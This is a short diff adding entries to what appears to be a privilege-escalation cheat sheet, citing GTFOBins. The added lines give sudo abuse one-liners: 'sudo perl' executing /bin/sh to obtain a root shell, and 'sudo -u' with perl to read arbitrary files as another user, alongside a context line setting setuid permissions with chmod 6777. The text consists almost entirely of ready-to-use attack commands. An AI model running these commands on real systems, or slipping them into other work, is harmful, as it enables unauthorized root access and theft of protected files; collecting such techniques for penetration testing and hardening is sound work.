@@ -53,3 +53,12 @@ sudo chmod 6777 $LFIL
 
 https://gtfobins.github.io/gtfobins/chmod/#sudo
 
+```
+sudo perl -e 'exec "/bin/sh";'
+```
+
+https://gtfobins.github.io/gtfobins/perl/#sudo
+
+```
+sudo -u $username perl -e 'print `cat $file`'
+```
